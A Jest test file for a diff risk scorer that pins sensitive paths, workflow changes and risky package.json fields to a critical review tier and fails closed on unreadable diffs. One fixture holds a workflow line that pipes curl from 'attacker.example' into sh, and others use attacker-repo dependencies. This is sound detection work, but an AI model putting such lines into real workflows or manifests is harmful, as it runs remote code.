const {
  score,
  computeScore,
  classifyChangeNature,
  scoreToKnobs,
  matchesPattern,
  isForcedLogic,
  deepMerge,
  manifestRisk,
  DEFAULTS,
} = require("../risk-score");
const { execFileSync } = require("child_process");
const fs = require("fs");
const path = require("path");
const { makeTempDir } = require("./helpers/tmp.js");

// Helper: build a descriptor.
function d(file, status = "M", patch = "", lines = 10, isBinary = false) {
  return { file, status, isBinary, lines, patch };
}

function manifest(before, after, status = "M", file = "package.json") {
  return {
    ...d(file, status, "+ manifest", 1),
    manifest: {
      before: {
        ok: true,
        value: before === null ? null : JSON.stringify(before),
      },
      after: { ok: true, value: after === null ? null : JSON.stringify(after) },
    },
  };
}

// Helper: full score from a descriptor list (computes diffStats from lines).
function scoreOf(descriptors, cfg = DEFAULTS) {
  const diffStats = {
    files: descriptors.length,
    lines: descriptors.reduce((n, x) => n + (x.lines || 0), 0),
  };
  return computeScore(descriptors, diffStats, cfg);
}

// ─── glob matcher ────────────────────────────────────────────────────────────

describe("globToRegExp / matchesPattern", () => {
  it("** matches across path separators and zero dirs", () => {
    expect(matchesPattern("a/b/c.js", ["**/c.js"])).toBe(true);
    expect(matchesPattern("c.js", ["**/c.js"])).toBe(true);
    expect(
      matchesPattern(".github/workflows/ci.yml", ["**/.github/workflows/**"]),
    ).toBe(true);
  });
  it("* stays within a segment", () => {
    expect(matchesPattern("lib/a.js", ["lib/*.js"])).toBe(true);
    expect(matchesPattern("lib/sub/a.js", ["lib/*.js"])).toBe(false);
  });
  it("escapes regex metachars in literals", () => {
    expect(matchesPattern("package.json", ["**/package.json"])).toBe(true);
    expect(matchesPattern("packageXjson", ["**/package.json"])).toBe(false);
  });
});

// ─── change nature ──────────────────────────────────────────────────────────

describe("classifyChangeNature", () => {
  const floor = DEFAULTS.securityFloor;

  it("comment-only JS change → mechanical", () => {
    expect(
      classifyChangeNature([d("lib/util.js", "M", "+// a note\n+\n")], floor),
    ).toBe("mechanical");
  });
  it("new test file → mechanical", () => {
    expect(
      classifyChangeNature([d("tests/new.test.js", "A", "+stuff")], floor),
    ).toBe("mechanical");
  });
  it("additive-only edit to existing test → mechanical", () => {
    expect(
      classifyChangeNature(
        [d("x.test.js", "M", '+it("more", () => {})')],
        floor,
      ),
    ).toBe("mechanical");
  });
  it("a real logic line → logic", () => {
    expect(
      classifyChangeNature([d("lib/a.js", "M", "+if (x) doThing()")], floor),
    ).toBe("logic");
  });
  it("deletion is forced logic", () => {
    expect(classifyChangeNature([d("lib/a.js", "D", "")], floor)).toBe("logic");
  });
  it(".github/workflows is forced logic even if comment-only", () => {
    expect(
      classifyChangeNature(
        [d(".github/workflows/ci.yml", "M", "+# note")],
        floor,
      ),
    ).toBe("logic");
  });
  it("executable prompt surface (skills/) is forced logic", () => {
    expect(
      classifyChangeNature(
        [d("skills/quality/SKILL.md", "M", "+<!-- note -->")],
        floor,
      ),
    ).toBe("logic");
  });
  it("directive comment (eslint-disable) is NOT inert → logic", () => {
    expect(
      classifyChangeNature(
        [d("lib/a.js", "M", "+// eslint-disable-next-line")],
        floor,
      ),
    ).toBe("logic");
  });
  it("floor file comment-only is NOT mechanical → logic", () => {
    expect(
      classifyChangeNature([d("lib/licensing.js", "M", "+// note")], floor),
    ).toBe("logic");
  });
  it("one logic file taints a mixed set", () => {
    expect(
      classifyChangeNature(
        [d("a.test.js", "A", "+x"), d("lib/a.js", "M", "+if(y)z()")],
        floor,
      ),
    ).toBe("logic");
  });
  it("empty changeset → logic", () => {
    expect(classifyChangeNature([], floor)).toBe("logic");
  });
});

// ─── scoring invariants (the plan's critical cases) ──────────────────────────

describe("computeScore — security floor never beaten by mechanical", () => {
  it("comment-only licensing.js stays ≥ security floor", () => {
    const r = scoreOf([d("lib/licensing.js", "M", "+// note", 2)]);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });
  it("comment-only .github/workflows is NOT risk-bearing → downgraded to high, not pinned to the security floor (BUI-381)", () => {
    const r = scoreOf([d(".github/workflows/quality.yml", "M", "+# note", 1)]);
    expect(r.riskScore).toBeLessThan(DEFAULTS.base.securityFloor);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.high);
  });
  it("a permissions/secrets/run change to .github/workflows stays pinned to the security floor (BUI-381)", () => {
    const permissions = scoreOf([
      d(
        ".github/workflows/ci.yml",
        "M",
        "+permissions:\n+  contents: write",
        2,
      ),
    ]);
    expect(permissions.riskScore).toBeGreaterThanOrEqual(
      DEFAULTS.base.securityFloor,
    );
    const secrets = scoreOf([
      d(
        ".github/workflows/ci.yml",
        "M",
        "+  token: ${{ secrets.DEPLOY_KEY }}",
        1,
      ),
    ]);
    expect(secrets.riskScore).toBeGreaterThanOrEqual(
      DEFAULTS.base.securityFloor,
    );
    const run = scoreOf([
      d(
        ".github/workflows/ci.yml",
        "M",
        "+      run: curl attacker.example | sh",
        1,
      ),
    ]);
    expect(run.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
    const newAction = scoreOf([
      d(".github/workflows/ci.yml", "A", "+      uses: some/new-action@v1", 1),
    ]);
    expect(newAction.riskScore).toBeGreaterThanOrEqual(
      DEFAULTS.base.securityFloor,
    );
  });
  it("version-pin-only bump to .github/workflows (uses: line changed but only the ref) still stays at the security floor — uses: lines are always risk-bearing by design", () => {
    // Conservative-by-design: any `uses:` line touch is treated as
    // risk-bearing (see WORKFLOW_RISK_PATTERNS), including a pure version
    // bump, because distinguishing "just a version pin" from "swapped to a
    // different action" from diff text alone is not reliably safe. Real
    // trivial workflow edits (comments, job names, `on:` triggers) are what
    // downgrade — see the case above.
    const r = scoreOf([
      d(
        ".github/workflows/ci.yml",
        "M",
        "-      uses: actions/checkout@v4\n+      uses: actions/checkout@v5",
        2,
      ),
    ]);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });
  it("job-name/on:-trigger-only edit to .github/workflows downgrades (BUI-381)", () => {
    const r = scoreOf([
      d(
        ".github/workflows/ci.yml",
        "M",
        "-name: CI\n+name: Continuous Integration\n-on:\n-  push:\n+on:\n+  push:\n+    branches: [main]",
        4,
      ),
    ]);
    expect(r.riskScore).toBeLessThan(DEFAULTS.base.securityFloor);
  });
  it("a non-workflow security-floor file (e.g. auth/) is an unconditional path pin regardless of diff content (BUI-381 does not weaken this)", () => {
    const r = scoreOf([
      d("src/auth/session.js", "M", "+// harmless comment", 1),
    ]);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });
  it.each([
    "secrets/aws.json",
    "credentials/cloud.json",
    "passwords/admin.txt",
    "tokens/api.json",
    "webhooks/receive.js",
    "license/policy.js",
    "licensing/policy.js",
    "deployments/ship.sh",
    "keystore/config.json",
    "keystores/config.json",
    "keyring/config.json",
    "keychain/config.json",
    "AUTH/session.js",
    "Secrets/aws.json",
    "server.PEM",
    ".ENV",
    "certs/client.p12",
    "certs/store.pfx",
    "config/app.jks",
    "config/store.keystore",
    "src/auth.ts",
    "src/oauth.ts",
    "src/api-key.txt",
    "config/key.yaml",
    "src/keystore.yaml",
    "src/keyring.ts",
    "src/keychain.json",
    "src/server.ppk",
    "src/server.pk8",
    "key-material/config.json",
    "key_store/config.json",
    "safe\n/auth/session.js",
    "safe\r/keys/server.pem",
    "safe/server.pem\n",
    "safe/server.pem\r",
  ])("sensitive directory path %s stays at the security floor", (file) => {
    const r = scoreOf([d(file, "M", "+// note", 1)]);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });

  it("a reviewed config cannot erase the immutable security floor", () => {
    const cfg = deepMerge(DEFAULTS, {
      securityFloor: [],
      base: { securityFloor: 0 },
    });
    const r = scoreOf([d("secrets/aws.json", "M", "+x", 1)], cfg);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });
});

describe("computeScore — package manifests use semantic field risk", () => {
  it("metadata-only edits stay low", () => {
    const r = scoreOf([
      manifest({ description: "before" }, { description: "after" }),
    ]);
    expect(r.riskScore).toBeLessThanOrEqual(20);
  });

  it("dev tooling and engines are medium", () => {
    for (const descriptor of [
      manifest({ devDependencies: {} }, { devDependencies: { vitest: "^4" } }),
      manifest({ engines: { node: "22" } }, { engines: { node: "24" } }),
    ]) {
      const r = scoreOf([descriptor]);
      expect(r.riskScore).toBeGreaterThan(20);
      expect(r.riskScore).toBeLessThan(50);
    }
  });

  it.each([
    [
      "runtime dependencies",
      { dependencies: {} },
      { dependencies: { zod: "^4" } },
    ],
    ["exports", {}, { exports: { ".": "./index.js" } }],
    ["bin", {}, { bin: { tool: "./cli.js" } }],
    ["workspaces", {}, { workspaces: ["packages/*"] }],
  ])("%s are high but not critical", (_label, before, after) => {
    const r = scoreOf([manifest(before, after)]);
    expect(r.riskScore).toBeGreaterThanOrEqual(50);
    expect(r.riskScore).toBeLessThan(DEFAULTS.base.securityFloor);
  });

  it.each([
    [
      "install lifecycle",
      { scripts: {} },
      { scripts: { postinstall: "node install.js" } },
    ],
    [
      "remote dependency",
      { dependencies: {} },
      { dependencies: { pkg: "git+https://example.com/pkg.git" } },
    ],
    [
      "GitHub shorthand dependency",
      { dependencies: {} },
      { dependencies: { pkg: "attacker/repo" } },
    ],
    [
      "SCP-style Git dependency",
      { dependencies: {} },
      { dependencies: { pkg: "git@github.com:attacker/repo.git" } },
    ],
    [
      "unprefixed local dependency",
      { dependencies: {} },
      { dependencies: { pkg: "../pkg" } },
    ],
    [
      "bare tgz dependency",
      { dependencies: {} },
      { dependencies: { pkg: "pkg.tgz" } },
    ],
    [
      "bare tar.gz dependency",
      { dependencies: {} },
      { dependencies: { pkg: "package.tar.gz" } },
    ],
    ["overrides", {}, { overrides: { pkg: "1.0.0" } }],
    ["resolutions", {}, { resolutions: { pkg: "1.0.0" } }],
  ])("%s changes are critical", (_label, before, after) => {
    const r = scoreOf([manifest(before, after)]);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });

  it.each([
    "^1.2.3",
    "latest",
    "npm:real-pkg",
    "npm:@scope/real-pkg",
    "npm:real-pkg@^2",
    "workspace:*",
  ])("registry dependency form %s stays high rather than critical", (spec) => {
    const r = scoreOf([
      manifest({ dependencies: {} }, { dependencies: { pkg: spec } }),
    ]);
    expect(r.riskScore).toBe(DEFAULTS.base.high);
  });

  it("mixed fields take the highest risk", () => {
    const r = scoreOf([
      manifest(
        { description: "before", dependencies: {} },
        { description: "after", dependencies: { zod: "^4" } },
      ),
    ]);
    expect(r.riskScore).toBeGreaterThanOrEqual(50);
  });

  it("nested workspace manifests are classified", () => {
    const r = scoreOf([
      manifest(
        { dependencies: {} },
        { dependencies: { zod: "^4" } },
        "M",
        "packages/app/package.json",
      ),
    ]);
    expect(r.riskScore).toBeGreaterThanOrEqual(50);
  });

  it.each(["A", "D", "R", "C", "T"])(
    "%s manifest changes fail critical",
    (status) => {
      const r = scoreOf([manifest({}, {}, status)]);
      expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
    },
  );

  it("unreadable or invalid snapshots fail critical", () => {
    for (const descriptor of [
      {
        ...manifest({}, {}),
        manifest: { before: { ok: false }, after: { ok: true, value: "{}" } },
      },
      {
        ...manifest({}, {}),
        manifest: {
          before: { ok: true, value: "{" },
          after: { ok: true, value: "{}" },
        },
      },
    ]) {
      expect(scoreOf([descriptor]).riskScore).toBeGreaterThanOrEqual(
        DEFAULTS.base.securityFloor,
      );
    }
  });
});

describe("computeScore — large mechanical diff is not low-risk", () => {
  it("600-line additive test does not drop to the trivial band", () => {
    const r = scoreOf([d("tests/big.test.js", "A", "+x", 600)]);
    // mechanical downgrade is suppressed above the cap, and magnitude adds.
    expect(r.changeNature).toBe("mechanical");
    expect(r.riskScore).toBeGreaterThan(20);
  });
});

describe("score — rename-aware workload", () => {
  function git(cwd, args) {
    return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
  }

  it("counts only residual edits in renamed files, while retaining changed-file overhead", () => {
    const root = makeTempDir("quality-renames-");
    git(root, ["init", "-q", "-b", "main"]);
    git(root, ["config", "user.name", "Quality Test"]);
    git(root, ["config", "user.email", "quality@example.com"]);
    fs.mkdirSync(path.join(root, "src", "old"), { recursive: true });
    const largeBody = Array.from(
      { length: 500 },
      (_, index) => `export const oldName${index} = ${index};`,
    ).join("\n");
    fs.writeFileSync(
      path.join(root, "src", "old", "pure.js"),
      `${largeBody}\n`,
    );
    fs.writeFileSync(
      path.join(root, "src", "old", "edited.js"),
      `${largeBody}\nexport const packageName = "old-package";\n`,
    );
    git(root, ["add", "."]);
    git(root, ["commit", "-q", "-m", "base"]);
    fs.renameSync(path.join(root, "src", "old"), path.join(root, "src", "new"));
    fs.writeFileSync(
      path.join(root, "src", "new", "edited.js"),
      `${largeBody}\nexport const packageName = "new-package";\n`,
    );
    git(root, ["add", "-A"]);
    git(root, ["commit", "-q", "-m", "rename package"]);

    const result = score({
      base: "HEAD^",
      repoRoot: root,
      gitRunner: (args) => git(root, args),
    });

    expect(result.diffStats).toEqual({ files: 2, lines: 2 });
    expect(result.riskScore).toBeLessThan(75);
  });

  it("keeps substantial edits inside a rename classified as logic and escalates magnitude", () => {
    const descriptor = {
      ...d("src/new/service.js", "R", "-old()\n+newBehavior()", 600),
      baseFile: "src/old/service.js",
      similarity: 60,
      pureRename: false,
    };
    const result = scoreOf([descriptor]);
    expect(result.changeNature).toBe("logic");
    expect(result.riskScore).toBeGreaterThanOrEqual(50);
  });

  it("classifies a pure non-sensitive move as mechanical", () => {
    const descriptor = {
      ...d("src/new/service.js", "R", "", 0),
      baseFile: "src/old/service.js",
      similarity: 100,
      pureRename: true,
    };
    expect(scoreOf([descriptor]).changeNature).toBe("mechanical");
  });
});

describe("computeScore — trivial change goes low (but never zero handling)", () => {
  it("tiny comment-only change in a docs file → low score", () => {
    const r = scoreOf([d("docs/readme-notes.md", "M", "+<!-- note -->", 1)]);
    expect(r.riskScore).toBeLessThanOrEqual(20);
  });
  it("small logic change in a plain source file → medium-ish, not floor", () => {
    const r = scoreOf([d("lib/widget.js", "M", "+if (a) b()", 5)]);
    expect(r.riskScore).toBeGreaterThan(20);
    expect(r.riskScore).toBeLessThan(DEFAULTS.base.securityFloor);
  });
});

// ─── base resolution determinism (BUI-340 / 2.7) ─────────────────────────────

describe("score — base resolution is deterministic and fails closed", () => {
  // A gitRunner where origin/main IS present locally: the same diff must score
  // against the merge-base, identically to the CI (GITHUB_BASE_REF) path.
  const NAME_STATUS = "M\0lib/widget.js\0";
  const NUMSTAT = "40\t0\tlib/widget.js\0";

  function runnerWith({ hasOriginMain, hasUpstream }) {
    return (args) => {
      const a = args.join(" ");
      if (
        a.startsWith("rev-parse --abbrev-ref --symbolic-full-name @{upstream}")
      ) {
        if (hasUpstream) return "origin/feature-base";
        throw new Error("no upstream");
      }
      if (a.startsWith("rev-parse --verify --quiet")) {
        const ok =
          (hasOriginMain && a.includes("origin/main")) ||
          (hasUpstream && a.includes("origin/feature-base"));
        if (ok) return "abc123";
        throw new Error("unknown ref");
      }
      if (a.startsWith("merge-base")) return "base00";
      if (a.includes("--name-status")) return NAME_STATUS;
      if (a.includes("--numstat")) return NUMSTAT;
      return "";
    };
  }

  it("scores identically whether origin/main or an upstream is the resolvable base", () => {
    const viaOriginMain = score({
      gitRunner: runnerWith({ hasOriginMain: true }),
    });
    const viaUpstream = score({ gitRunner: runnerWith({ hasUpstream: true }) });
    expect(viaOriginMain.riskScore).toBe(viaUpstream.riskScore);
    expect(viaOriginMain.baseUnresolved).toBeUndefined();
  });

  it("scores identically to an explicit --base (the pipeline path)", () => {
    const explicit = score({
      base: "origin/main",
      gitRunner: runnerWith({ hasOriginMain: true }),
    });
    const discovered = score({
      gitRunner: runnerWith({ hasOriginMain: true }),
    });
    expect(explicit.riskScore).toBe(discovered.riskScore);
  });

  it("FAILS CLOSED (score 100) when no durable base resolves — never a low HEAD~1 score", () => {
    // The starknet bug: a fresh worktree without origin/main used to diff only
    // HEAD~1 and score small. Now it must score maximum, not minimum.
    // Clear GITHUB_BASE_REF: CI sets it, and it would resolve a base and mask
    // the truly-unresolved path this test exercises.
    const prev = process.env.GITHUB_BASE_REF;
    delete process.env.GITHUB_BASE_REF;
    let r;
    try {
      r = score({
        gitRunner: runnerWith({ hasOriginMain: false, hasUpstream: false }),
      });
    } finally {
      if (prev !== undefined) process.env.GITHUB_BASE_REF = prev;
    }
    expect(r.riskScore).toBe(100);
    expect(r.taskType).toBe("unknown");
    expect(r.baseUnresolved).toBe(true);
    expect(r.reasons.join(" ")).toMatch(/base unresolved/i);
    // diffStats must keep the { files, lines } shape the CLI/GITHUB_OUTPUT
    // consumer reads — not undefined fields that print as "diffFiles=undefined".
    expect(r.diffStats).toHaveProperty("files");
    expect(r.diffStats).toHaveProperty("lines");
    expect(r.knobs).toHaveProperty("agents");
  });

  it("BUI-603 #3: reports a merge-base failure in reasons instead of silently substituting the raw base ref", () => {
    const runner = (args) => {
      const a = args.join(" ");
      if (
        a.startsWith("rev-parse --abbrev-ref --symbolic-full-name @{upstream}")
      ) {
        throw new Error("no upstream");
      }
      if (a.startsWith("rev-parse --verify --quiet")) {
        if (a.includes("origin/main")) return "abc123";
        throw new Error("unknown ref");
      }
      if (a.startsWith("merge-base")) throw new Error("no merge base");
      if (a.includes("--name-status")) return NAME_STATUS;
      if (a.includes("--numstat")) return NUMSTAT;
      return "";
    };
    const r = score({ gitRunner: runner });
    expect(r.baseUnresolved).toBeUndefined();
    expect(r.diffCollectionFailed).toBeUndefined();
    expect(r.reasons.join(" ")).toMatch(/merge-base .* failed/i);
  });

  it("honors GITHUB_BASE_REF for the CI path", () => {
    const prev = process.env.GITHUB_BASE_REF;
    process.env.GITHUB_BASE_REF = "main";
    try {
      const r = score({
        gitRunner: runnerWith({ hasOriginMain: false, hasUpstream: false }),
      });
      // GITHUB_BASE_REF resolves a base, so it does NOT fail closed.
      expect(r.baseUnresolved).toBeUndefined();
    } finally {
      if (prev === undefined) delete process.env.GITHUB_BASE_REF;
      else process.env.GITHUB_BASE_REF = prev;
    }
  });
});

// ─── score → knobs (Moderate curve) ──────────────────────────────────────────

describe("scoreToKnobs — Moderate curve", () => {
  it("score 10 → 2 agents, no codex", () => {
    expect(scoreToKnobs(10, DEFAULTS)).toEqual({
      agents: 2,
      codex: "skip",
      codexRounds: 0,
    });
  });
  it("score 40 → 4 agents, codex high x1", () => {
    expect(scoreToKnobs(40, DEFAULTS)).toEqual({
      agents: 4,
      codex: "high",
      codexRounds: 1,
    });
  });
  it("score 70 → 6 agents, codex high x1", () => {
    expect(scoreToKnobs(70, DEFAULTS)).toEqual({
      agents: 6,
      codex: "high",
      codexRounds: 1,
    });
  });
  it("score 90 → 6 agents, one xhigh discovery pass", () => {
    expect(scoreToKnobs(90, DEFAULTS)).toEqual({
      agents: 6,
      codex: "xhigh",
      codexRounds: 1,
    });
  });
  it("codexForceFloor: a ≥75 score never has codex skip", () => {
    // craft a band where skip might apply but force-floor overrides
    const cfg = deepMerge(DEFAULTS, {
      curve: [{ maxScore: 100, agents: 2, codex: "skip", codexRounds: 0 }],
    });
    expect(scoreToKnobs(80, cfg).codex).not.toBe("skip");
  });
  it("a repo-committed curve cannot weaken review below the built-in baseline for scores under 75", () => {
    // BUI-603 #2: previously the baseline clamp only fired at
    // effectiveScore >= 75, so a curve like this let a 69-74 score through
    // with 2 agents and no Codex verification.
    const cfg = deepMerge(DEFAULTS, {
      curve: [{ maxScore: 100, agents: 2, codex: "skip", codexRounds: 0 }],
      codexForceFloor: 101,
    });
    const baseline = DEFAULTS.curve.find((band) => 69 <= band.maxScore);
    const knobs = scoreToKnobs(69, cfg);
    expect(knobs.agents).toBeGreaterThanOrEqual(baseline.agents);
    expect(knobs.codex).not.toBe("skip");
  });
  it.each([75, 76, 80, 84, 85])(
    "reviewed config cannot weaken critical review depth at score %i",
    (score) => {
      const cfg = deepMerge(DEFAULTS, {
        curve: [{ maxScore: 100, agents: 2, codex: "skip", codexRounds: 0 }],
        codexForceFloor: 101,
      });
      expect(scoreToKnobs(score, cfg)).toEqual({
        agents: 6,
        codex: "xhigh",
        codexRounds: 1,
      });
    },
  );
});

// ─── config override merge ───────────────────────────────────────────────────

describe("deepMerge / override", () => {
  it("repo scorePolicy overrides defaults but keeps unspecified keys", () => {
    const merged = deepMerge(DEFAULTS, { base: { medium: 99 } });
    expect(merged.base.medium).toBe(99);
    expect(merged.base.securityFloor).toBe(DEFAULTS.base.securityFloor);
  });
  it("a repo can extend securityFloor via override", () => {
    const cfg = deepMerge(DEFAULTS, { securityFloor: ["**/custom-secret.ts"] });
    const r = scoreOf([d("src/custom-secret.ts", "M", "+// note", 1)], cfg);
    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
  });
});

// ─── low/medium tier boundary regression (BUI-453) ──────────────────────────
//
// BUI-452 made the low/medium boundary load-bearing: a diff scoring < 20
// authorizes merge on CI-only evidence when AI review is unavailable, so a
// silent shift of this boundary now changes merge authorization, not just
// review depth. These fixtures pin concrete example diffs on both sides of
// the score-20 curve edge (scripts/risk-score.js DEFAULTS.curve[0].maxScore)
// so a future scorer change that drifts the boundary fails loudly here
// instead of surfacing as a production merge-authorization regression.
describe("low/medium risk tier boundary (BUI-453)", () => {
  const LOW_MEDIUM_BOUNDARY = 20;

  it("a 300-line docs-only diff stays low risk (score 19, just under the boundary)", () => {
    const r = scoreOf([
      d("docs/big.md", "M", Array(300).fill("+x").join("\n"), 300),
    ]);
    expect(r.riskScore).toBe(19);
    expect(r.riskScore).toBeLessThan(LOW_MEDIUM_BOUNDARY);
  });

  it("a 340-line docs-only diff crosses into medium risk (score 21, just over the boundary)", () => {
    const r = scoreOf([
      d("docs/big.md", "M", Array(340).fill("+x").join("\n"), 340),
    ]);
    expect(r.riskScore).toBe(21);
    expect(r.riskScore).toBeGreaterThanOrEqual(LOW_MEDIUM_BOUNDARY);
  });

  it("a comment-only edit to an unclassified source file stays low risk regardless of size", () => {
    // src/*.js is base-35 "medium" by path, but a mechanical (comment-only)
    // change is discounted down to the low-risk floor — content, not just
    // path, determines the tier.
    const r = scoreOf([
      d("src/util.js", "M", Array(50).fill("+ // comment").join("\n"), 50),
    ]);
    expect(r.riskScore).toBe(10);
    expect(r.riskScore).toBeLessThan(LOW_MEDIUM_BOUNDARY);
  });

  it("a small logic change to an unclassified source file is medium risk, not low", () => {
    const r = scoreOf([d("src/util.js", "M", "+ const x = 1;", 5)]);
    expect(r.riskScore).toBe(35);
    expect(r.riskScore).toBeGreaterThanOrEqual(LOW_MEDIUM_BOUNDARY);
  });
});

// ─── helpers exposed for reuse ───────────────────────────────────────────────

describe("isForcedLogic / fileIsMechanical", () => {
  it("binary files are forced logic", () => {
    expect(isForcedLogic("img.png", "M", true)).toBe(true);
  });
  it("rename is forced logic", () => {
    expect(isForcedLogic("lib/a.js", "R", false)).toBe(true);
  });
  it("manifest risk classifies non-registry sources from values", () => {
    expect(
      manifestRisk(
        manifest(
          { devDependencies: {} },
          { devDependencies: { tool: "file:../tool" } },
        ),
      ).score,
    ).toBe(DEFAULTS.base.securityFloor);
  });
});

// The file's stated contract (see the unresolved-base branch in score()) is to
// fail CLOSED whenever the diff cannot be trusted: an unreadable diff can only
// produce a misleadingly LOW score, which under-provisions review.
describe("fail-closed on unreadable diffs", () => {
  // A runner that resolves a base successfully but fails the structural
  // `git diff` calls — a shallow clone, a GC'd object, or a missing
  // submodule ref.
  function runnerFailingDiff() {
    return (args) => {
      if (args[0] === "rev-parse" || args[0] === "merge-base") {
        return "abc123";
      }
      if (args[0] === "diff") {
        throw new Error("fatal: bad object abc123");
      }
      return "";
    };
  }

  it("scores maximum risk when diff collection fails", () => {
    const result = score({
      base: "origin/main",
      gitRunner: runnerFailingDiff(),
    });
    expect(result.riskScore).toBe(100);
    expect(result.diffCollectionFailed).toBe(true);
  });

  it("explains the failure instead of claiming no changes were found", () => {
    const result = score({
      base: "origin/main",
      gitRunner: runnerFailingDiff(),
    });
    expect(result.reasons.join(" ")).toMatch(/diff collection failed/i);
    expect(result.reasons.join(" ")).not.toMatch(/no changes detected/i);
  });

  it("provisions critical-tier review knobs on a failed diff", () => {
    const result = score({
      base: "origin/main",
      gitRunner: runnerFailingDiff(),
    });
    // Must not land on the base.medium knobs the empty-diff path produced.
    expect(result.knobs).toEqual(scoreToKnobs(100, DEFAULTS));
  });

  it("still reports a genuinely empty diff as low risk", () => {
    // Guards against over-correcting: git succeeding with no output is a real
    // "nothing changed", not a failure.
    const result = score({
      base: "origin/main",
      gitRunner: (args) => {
        if (args[0] === "rev-parse" || args[0] === "merge-base")
          return "abc123";
        return "";
      },
    });
    expect(result.diffCollectionFailed).toBeUndefined();
    expect(result.riskScore).toBeLessThan(75);
  });
});

// A JOB-level `permissions:` block is indented under `jobs.<id>:` and is the
// more common form. The pattern was anchored at column 0, so escalating a job
// to `id-token: write` — the OIDC-credential-exfiltration class this floor
// exists to catch — never matched and scored below the critical band.
describe("workflow permissions detection", () => {
  const workflowFile = ".github/workflows/release.yml";

  function scoreWorkflowPatch(patch) {
    return computeScore(
      [d(workflowFile, "M", patch, 4)],
      { files: 1, lines: 4 },
      DEFAULTS,
    ).riskScore;
  }

  it("holds the security floor for a job-level permissions escalation", () => {
    const patch = [
      "   jobs:",
      "     release:",
      "-      permissions:",
      "-        contents: read",
      "+      permissions:",
      "+        contents: write",
      "+        id-token: write",
    ].join("\n");
    expect(scoreWorkflowPatch(patch)).toBe(DEFAULTS.base.securityFloor);
  });

  it("holds the security floor for a top-level permissions change", () => {
    const patch = ["-permissions:", "+permissions:", "+  id-token: write"].join(
      "\n",
    );
    expect(scoreWorkflowPatch(patch)).toBe(DEFAULTS.base.securityFloor);
  });

  it("still downgrades a workflow diff that only bumps a comment", () => {
    // The content-aware downgrade must survive: this is why the pattern list
    // exists rather than pinning every workflow edit to the floor.
    const patch = ["-  # old note", "+  # new note"].join("\n");
    expect(scoreWorkflowPatch(patch)).toBeLessThan(DEFAULTS.base.securityFloor);
  });
});
